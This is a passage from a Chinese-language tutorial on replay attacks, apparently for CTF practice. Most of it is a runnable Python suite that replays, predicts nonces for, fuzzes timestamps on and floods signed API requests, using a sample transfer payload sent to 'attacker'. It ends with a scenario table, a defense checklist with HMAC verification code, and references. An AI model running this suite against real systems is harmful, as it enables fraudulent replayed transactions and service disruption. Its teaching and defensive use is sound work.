                "details": f"Accepted {success_count}/{count} times"
            })
            print(f"\n[!] PLAIN REPLAY: {success_count}/{count} accepted")
            return True
        return False

    def test_cross_user_replay(self, endpoint: str, payload: dict, other_session: requests.Session = None):
        """测试跨用户重放"""
        other = other_session or requests.Session()
        
        r = other.post(self.base + endpoint, json=payload, timeout=10)
        
        if r.status_code == 200:
            self.findings.append({
                "type": "cross_user_replay",
                "endpoint": endpoint,
                "details": f"Accepted for different session"
            })
            print(f"[!] CROSS-USER REPLAY on {endpoint}")
            return True
        return False

    # ──────── 4. Nonce 预测 ────────
    
    def predict_and_exploit(self, endpoint: str, base_payload: dict, nonce_field: str = "nonce"):
        """预测 nonce 并利用"""
        if len(self.collected_nonces) < 5:
            print("[-] Need at least 5 nonce samples")
            return False
        
        nonces = self.collected_nonces
        
        # 尝试预测
        if all(isinstance(n, int) for n in nonces):
            # 递增 → 预测下一个
            predicted = nonces[-1] + (nonces[-1] - nonces[-2])
            
            payload = {**base_payload, nonce_field: predicted}
            r = self.s.post(self.base + endpoint, json=payload, timeout=10)
            
            if r.status_code == 200:
                self.findings.append({
                    "type": "nonce_prediction",
                    "endpoint": endpoint,
                    "details": f"Predicted next nonce: {predicted}"
                })
                print(f"[!] NONCE PREDICTED: next = {predicted}")
                return True
        
        # 时间戳 nonce: 使用当前时间戳尝试
        now_ms = int(time.time() * 1000)
        for offset in range(-100, 100):
            payload = {**base_payload, nonce_field: now_ms + offset}
            r = self.s.post(self.base + endpoint, json=payload, timeout=10)
            if r.status_code == 200:
                self.findings.append({
                    "type": "nonce_timestamp_prediction",
                    "endpoint": endpoint,
                    "details": f"Accepted with timestamp nonce offset={offset}"
                })
                print(f"[!] TIMESTAMP NONCE: offset={offset} accepted")
                return True
        
        return False
    
    # ──────── 5. 并发重放 ────────
    
    def concurrent_replay(
        self,
        endpoint: str,
        payload: dict,
        concurrent_count: int = 50,
        worker_count: int = 20
    ) -> int:
        """并发重放测试"""
        success = [0]
        lock = threading.Lock()
        errors = [0]
        
        def do_replay(i: int):
            try:
                r = self.s.post(self.base + endpoint, json=payload, timeout=15)
                if r.status_code == 200:
                    with lock:
                        success[0] += 1
                return i, r.status_code, r.text[:50]
            except Exception as e:
                with lock:
                    errors[0] += 1
                return i, -1, str(e)
        
        print(f"\n[*] Concurrent replay: {concurrent_count} requests, {worker_count} workers")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=worker_count) as ex:
            futs = [ex.submit(do_replay, i) for i in range(concurrent_count)]
            for f in concurrent.futures.as_completed(futs):
                pass  # 不想打印太多
        
        succ = success[0]
        err = errors[0]
        print(f"  Success: {succ}/{concurrent_count}, Errors: {err}")
        
        if succ > 1:
            self.findings.append({
                "type": "concurrent_replay",
                "endpoint": endpoint,
                "details": f"{succ}/{concurrent_count} accepted (expected 1)"
            })
            print(f"[!] CONCURRENT REPLAY: {succ} successes!")
        
        return succ
    
    # ──────── 6. 时间戳 fuzzing ────────
    
    def timestamp_fuzzing(self, endpoint: str, base_payload: dict, ts_field: str = "ts"):
        """时间戳全面 fuzzing"""
        now = int(time.time())
        attacks = {}
        
        # 生成时间戳变体
        for name, ts in [
            ("epoch_0", 0),
            ("epoch_1", 1),
            ("negative", -1),
            ("now", now),
            ("future_1m", now + 60),
            ("future_1h", now + 3600),
            ("future_1d", now + 86400),
            ("future_1y", now + 31536000),
            ("past_1m", now - 60),
            ("past_1h", now - 3600),
            ("past_1d", now - 86400),
            ("past_30d", now - 2592000),
            ("past_1y", now - 31536000),
            ("int32_max", 2147483647),
            ("int32_min", -2147483648),
            ("string_now", str(now)),
            ("string_0", "0"),
            ("string_empty", ""),
            ("null", None),
            ("float_now", now + 0.5),
        ]:
            payload = {**base_payload, ts_field: ts}
            try:
                r = self.s.post(self.base + endpoint, json=payload, timeout=10)
                attacks[name] = {
                    "status": r.status_code,
                    "accepted": r.status_code == 200 and "expired" not in r.text.lower()
                }
            except Exception as e:
                attacks[name] = {"status": -1, "error": str(e)}
        
        # 输出结果
        accepted = [k for k, v in attacks.items() if v.get("accepted")]
        print(f"\n[*] Timestamp fuzzing results on {endpoint}")
        print(f"    Accepted: {accepted}")
        
        if len(accepted) > 3:  # 超过正常容忍范围
            self.findings.append({
                "type": "timestamp_bypass",
                "endpoint": endpoint,
                "details": f"Accepted timestamps: {accepted}"
            })
            print(f"[!] TIMESTAMP BYPASS: {len(accepted)} variants accepted")
        
        return attacks

    def time_window_exploit(self, endpoint: str, payload: dict, windows_ms: list = None):
        """测试时间窗口绕过
        
        原理：如果窗口是 N ms，在窗口内 old timestamp 可能仍被接受
        """
        windows_ms = windows_ms or [100, 500, 1000, 5000, 30000, 60000]
        now_ms = int(time.time() * 1000)
        
        for window in windows_ms:
            old_ts = now_ms - window
            payload["ts"] = old_ts
            
            r = self.s.post(self.base + endpoint, json=payload, timeout=10)
            
            if r.status_code == 200:
                print(f"[!] Window={window}ms: timestamp {window}ms ago still accepted")
                self.findings.append({
                    "type": "time_window_bypass",
                    "window_ms": window,
                    "details": f"Timestamp {window}ms old still accepted"
                })
    
    # ──────── 7. Nonce 耗尽 ────────
    
    def exhausted_nonce_test(self, endpoint: str, base_payload: dict, flood_count: int = 20000):
        """nonce 表耗尽后的重放测试"""
        print(f"\n[*] Nonce exhaustion test: sending {flood_count} unique nonces...")
        
        def flood_worker(start: int, end: int):
            sess = requests.Session()
            for i in range(start, end):
                try:
                    sess.post(self.base + endpoint, json={
                        **base_payload,
                        "nonce": f"exhaust_{i}"
                    }, timeout=5)
                except:
                    pass
        
        # 并行填充
        workers = 10
        chunk = flood_count // workers
        threads = []
        for w in range(workers):
            t = threading.Thread(
                target=flood_worker,
                args=(w * chunk, (w + 1) * chunk if w < workers - 1 else flood_count)
            )
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()
        
        print("[*] Flood complete. Testing replay...")
        
        # 测试重放
        test_cases = [
            ("oldest", "exhaust_0"),
            ("newest", f"exhaust_{flood_count - 1}"),
            ("brand_new", "after_exhaust_nonce"),
        ]
        
        for label, nonce_val in test_cases:
            r = self.s.post(self.base + endpoint, json={
                **base_payload,
                "nonce": nonce_val
            }, timeout=10)
            
            status = "[!] ACCEPTED" if r.status_code == 200 else "[.] rejected"
            print(f"  {label:10s} ({nonce_val:20s}): {r.status_code} {status}")
            
            if r.status_code == 200:
                self.findings.append({
                    "type": "nonce_exhaustion",
                    "endpoint": endpoint,
                    "details": f"Nonce '{nonce_val}' accepted after flood"
                })
    
    # ──────── 8. 报告 ────────
    
    def generate_report(self) -> str:
        """生成攻击报告"""
        if not self.findings:
            return "No vulnerabilities found."
        
        report = ["# Replay Attack Report", "", f"Target: {self.base}", f"Time: {datetime.utcnow().isoformat()}Z", ""]
        
        for i, finding in enumerate(self.findings, 1):
            report.append(f"## Finding {i}: {finding['type'].upper()}")
            report.append(f"- Endpoint: {finding['endpoint']}")
            report.append(f"- Detail: {finding['details']}")
            report.append("")
        
        report.append("## Summary")
        
        vuln_types = {}
        for f in self.findings:
            vuln_types[f['type']] = vuln_types.get(f['type'], 0) + 1
        
        for vtype, count in vuln_types.items():
            report.append(f"- {vtype}: {count}")
        
        return "\n".join(report)


# ════════════════════════════════════════
# 使用示例
# ════════════════════════════════════════

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python replay_attack_suite.py <target_url>")
        sys.exit(1)
    
    TARGET = sys.argv[1].rstrip("/")
    api = ReplayAttackSuite(TARGET)
    
    # 1. 发现受保护端点
    api.discover_nonce_endpoints()
    
    # 2. 对每个受保护端点做测试
    for endpoint, meta in api.known_operations.items():
        if not meta.get("requires_nonce", True):
            continue
        
        print(f"\n{'='*60}")
        print(f"Testing: {endpoint}")
        print(f"{'='*60}")
        
        base_payload = {"to": "attacker", "amount": 0.01}
        
        # 纯重放
        api.test_plain_replay(endpoint, base_payload)
        
        # 时间戳 fuzzing
        api.timestamp_fuzzing(endpoint, base_payload)
        
        # 并发重放
        api.concurrent_replay(endpoint, base_payload, concurrent_count=20)
        
        # 时间窗口
        api.time_window_exploit(endpoint, base_payload)
    
    # 3. 耗尽测试（谨慎使用，可能造成损害）
    # api.exhausted_nonce_test("/api/transfer", {"to": "test", "amount": 1})
    
    # 4. 输出报告
    print(f"\n\n{'='*60}")
    print(api.generate_report())
```

## 8. 常见 CTF 场景速查

| 场景 | 关键线索 | 攻击 |
|------|----------|------|
| 同请求重复提交通过 | 第一次成功，第二次也成功 | 纯重放 |
| nonce 是数字 | nonce=1,2,3 | 递增预测 |
| nonce 是时间戳 | nonce=1700000000000 | 用当前时间戳即可 |
| nonce 是 UUID | nonce=550e8400-... | 随机，不可预测 |
| 不传 nonce 也通过 | nonce 缺失 → 200 | 直接不传 |
| nonce=0 或 null 通过 | 特殊值绕过 | 看 3.1 全矩阵 |
| 时间戳很老也通过 | ts=0 → 200 | epoch 0/负数/未来 |
| 同一 nonce 不同操作通过 | transfer 的 nonce 可用于 withdraw | 跨操作重放 |
| 窗口内重放 | 5 秒内同一 nonce 有效 | 并发窗口攻击 |
| 重启后可重放 | 服务器重启 → nonce 表清空 | 触发重启 |
| 大量 nonce 后旧的可用 | 超过 10000 个请求后 earliest 可重放 | 表耗尽 |
| 签名绑定了 nonce 但 nonce 可预测 | sign = MD5(key + nonce + data) | 先预测 nonce 再算签名 |

## 9. 防御方案

```python
# 服务端正确的 nonce + timestamp 防御

"""
防御 checklist:

[必需]
1. Nonce 唯一性: 每个 nonce 只能使用一次，存储已用 nonce
2. Nonce 绑定用户: nonce 必须与 user_id/session_id 绑定
3. Nonce 绑定操作: nonce 必须与具体 API 操作绑定，不可跨操作
4. Timestamp 窗口: 接受时间戳 ±30 秒（通过 NTP 校准）
5. HMAC 签名: sign = HMAC-SHA256(key, nonce + ts + data)

[推荐]
6. 限制 nonce 存储大小：Redis SETEX + 48h TTL
7. IP + nonce 双重检查（但 IP 可能变化）
8. 递增 nonce 检查：拒绝已用的 nonce 值和小于最小值的 nonce
9. 签名包含 nonce + ts：防止篡改
10. 幂等 key：对关键操作（支付、发货）使用 idempotency key

[不要做]
• 只用 timestamp 不用 nonce
• nonce 值可预测（递增/时间戳/递增后 hash）
• nonce 绑定到全局而不是用户
• 签名不包含 nonce 和 ts
• 永不过期的 nonce
• 不限制 nonce 生成速率
"""

def secure_signature_verification(key: bytes, nonce: str, ts: int, data: dict, received_sign: str) -> bool:
    """安全的 HMAC 签名验证"""
    import hmac
    
    # 1. 检查 nonce 是否已用
    if nonce_exists(nonce):
        return False
    
    # 2. 检查时间戳偏差（±30 秒）
    now = int(time.time())
    if abs(ts - now) > 30:
        return False
    
    # 3. 验证 HMAC 签名
    message = f"{nonce}|{ts}|{json.dumps(data, sort_keys=True)}".encode()
    expected_sign = hmac.new(key, message, hashlib.sha256).hexdigest()
    
    if not hmac.compare_digest(expected_sign, received_sign):
        return False
    
    # 4. 标记 nonce 已用（原子操作，如 Redis SETNX）
    mark_nonce_used(nonce, ttl=48 * 3600)
    
    return True
```

## 10. 参考

- [OWASP: Replay Attack](https://owasp.org/www-community/attacks/Replay_attack)
- JWT nonce 标准 (RFC 7519): `jti` claim
- Stripe Idempotency: `Idempotency-Key` header
- AWS Signature V4: 每个请求唯一 signature (nonce + timestamp + scope)
- OCSP Stapling: nonce 防重放

> 记住：一个被接受的重复请求就是一个漏洞。不要假设客户端会「守规矩」只发一次。每次收到签名的请求，都要假定这是重放。
